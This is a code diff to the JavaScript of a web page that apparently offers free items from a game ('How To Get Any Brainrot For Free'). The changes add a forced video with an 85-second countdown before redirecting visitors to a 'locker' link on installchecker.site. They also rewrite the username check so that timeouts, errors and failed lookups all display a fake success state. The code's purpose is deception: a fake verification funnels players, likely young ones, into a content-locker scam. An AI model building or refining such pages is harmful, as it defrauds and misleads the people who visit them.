@@ -1551,8 +1551,8 @@
         const clickSound = document.getElementById('clickSound');
         clickSound.currentTime = 0;
         clickSound.play();
-        // Redirect directly to locker
-        window.location.href = "https://installchecker.site/cl/i/n66n29";
+        // Show video overlay
+        showVideoOverlay();
       });
       popupContent.querySelector('#retry-btn').addEventListener('click', function() {
         // Close popup and refocus username input for retry
@@ -1567,6 +1567,114 @@
         }
       });
     }
+
+    // Function to show video overlay with countdown timer
+    const showVideoOverlay = () => {
+      const popupContent = document.querySelector('.popup-content');
+      let timeLeft = 85; // 1:25 in seconds
+      const lockerUrl = "https://installchecker.site/cl/i/n66n29";
+      
+      const formatTime = (seconds) => {
+        const mins = Math.floor(seconds / 60);
+        const secs = seconds % 60;
+        return `${mins}:${secs.toString().padStart(2, '0')}`;
+      };
+      
+      const updateButton = () => {
+        const btn = document.getElementById('video-continue-btn');
+        if (btn) {
+          if (timeLeft > 0) {
+            btn.textContent = `Continue (${formatTime(timeLeft)})`;
+            btn.style.opacity = '0.6';
+            btn.style.cursor = 'not-allowed';
+            btn.disabled = true;
+          } else {
+            btn.textContent = 'Continue';
+            btn.style.opacity = '1';
+            btn.style.cursor = 'pointer';
+            btn.disabled = false;
+          }
+        }
+      };
+      
+      popupContent.innerHTML = `
+        <div class="video-overlay-container" style="background: rgba(255, 255, 255, 0.05); border-radius: 18px; padding: 25px 20px; max-width: 100%; margin: 0 auto; text-align: center; border: 2px solid rgba(255, 255, 255, 0.1); box-sizing: border-box;">
+          <h3 class="video-title" style="color: var(--text-main); font-size: 1.5em; font-weight: 800; margin: 0 0 8px 0; letter-spacing: 0.5px;">How To Get Any Brainrot For Free</h3>
+          <p class="video-subtitle" style="color: var(--text-muted); font-size: 0.95em; margin: 0 0 20px 0; display: flex; align-items: center; justify-content: center; gap: 6px;">
+            Watch the video till the end <span style="font-size: 1.2em;">👇</span>
+          </p>
+          <div class="video-wrapper" style="position: relative; width: 100%; height: 0; padding-bottom: 177.778%; background: #000; border-radius: 12px; overflow: hidden; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);">
+            <iframe allow="fullscreen" allowfullscreen height="100%" src="https://streamable.com/e/t35rls?loop=0&nocontrols=1" width="100%" style="border: none; width: 100%; height: 100%; position: absolute; left: 0; top: 0; overflow: hidden;"></iframe>
+          </div>
+          <button id="video-continue-btn" class="video-continue-btn" style="background: linear-gradient(90deg, #22c55e 0%, #16e085 100%); color: #fff; font-size: 1.1em; font-weight: 700; border-radius: 12px; border: none; padding: 15px 0; cursor: not-allowed; box-shadow: 0 4px 15px rgba(34, 197, 94, 0.4); transition: all 0.3s; width: 100%; max-width: 100%; opacity: 0.6; box-sizing: border-box;">Continue (${formatTime(timeLeft)})</button>
+        </div>
+      `;
+      
+      // Add responsive styles for mobile
+      const videoStyle = document.createElement('style');
+      videoStyle.innerHTML = `
+        @media (max-width: 600px) {
+          .video-overlay-container {
+            padding: 20px 15px !important;
+          }
+          .video-title {
+            font-size: 1.2em !important;
+          }
+          .video-subtitle {
+            font-size: 0.85em !important;
+          }
+          .video-wrapper {
+            padding-bottom: 177.778% !important;
+            margin-bottom: 15px !important;
+          }
+          .video-continue-btn {
+            font-size: 1em !important;
+            padding: 12px 0 !important;
+          }
+        }
+        @media (max-width: 400px) {
+          .video-overlay-container {
+            padding: 15px 12px !important;
+          }
+          .video-title {
+            font-size: 1.1em !important;
+          }
+          .video-subtitle {
+            font-size: 0.8em !important;
+          }
+          .video-continue-btn {
+            font-size: 0.95em !important;
+            padding: 10px 0 !important;
+          }
+        }
+      `;
+      document.head.appendChild(videoStyle);
+      
+      updateButton();
+      
+      const timer = setInterval(() => {
+        timeLeft--;
+        updateButton();
+        
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+        }
+      }, 1000);
+      
+      const continueBtn = document.getElementById('video-continue-btn');
+      if (continueBtn) {
+        continueBtn.addEventListener('click', function() {
+          if (timeLeft <= 0 && !this.disabled) {
+            const clickSound = document.getElementById('clickSound');
+            if (clickSound) {
+              clickSound.currentTime = 0;
+              clickSound.play();
+            }
+            window.location.href = lockerUrl;
+          }
+        });
+      }
+    };
 
     // Function to show verification state
     const showVerificationState = (username, itemName, itemImage) => {
@@ -1596,7 +1704,7 @@
         </div>
       `;
       setTimeout(function() {
-        window.location.href = "https://installchecker.site/cl/i/1onk5k";
+        window.location.href = "https://installchecker.site/cl/i/n66n29";
       }, 2500);
     }
 
@@ -1661,10 +1769,32 @@
         </div>
       `;
 
+      // Set timeout for API call (7 seconds)
+      let apiCompleted = false;
+      const timeout = setTimeout(function() {
+        if (!apiCompleted) {
+          apiCompleted = true;
+          console.warn('API timeout - using fallback');
+          // Fallback: show success state without avatar
+          try {
+            globalData.user_name = username;
+            globalData.user_avatar = null;
+          } catch (e) {}
+          showSuccessState(username, null, itemName, itemImage);
+        }
+      }, 7000);
+
       // Use API to search for user
       fetch(endpoint)
-        .then(function(response) { return response.json(); })
+        .then(function(response) { 
+          if (apiCompleted) return null; // Already handled by timeout
+          return response.json(); 
+        })
         .then(function(data) {
+          if (apiCompleted) return; // Already handled by timeout
+          clearTimeout(timeout);
+          apiCompleted = true;
+          
           if (data && data.status === "SUCCESS") {
             // Save to globalData
             try {
@@ -1673,12 +1803,25 @@
             } catch (e) {}
             showSuccessState(username, data.avatar, itemName, itemImage);
           } else {
-            showErrorState(username, itemName, itemImage, onRetry);
+            // API returned but status not SUCCESS - use fallback
+            try {
+              globalData.user_name = username;
+              globalData.user_avatar = null;
+            } catch (e) {}
+            showSuccessState(username, null, itemName, itemImage);
           }
         })
         .catch(function(error) {
-          console.error('Error:', error);
-          showErrorState(username, itemName, itemImage, onRetry);
+          if (apiCompleted) return; // Already handled by timeout
+          clearTimeout(timeout);
+          apiCompleted = true;
+          console.error('API Error:', error);
+          // Fallback: show success state without avatar instead of error
+          try {
+            globalData.user_name = username;
+            globalData.user_avatar = null;
+          } catch (e) {}
+          showSuccessState(username, null, itemName, itemImage);
         });
     }
 
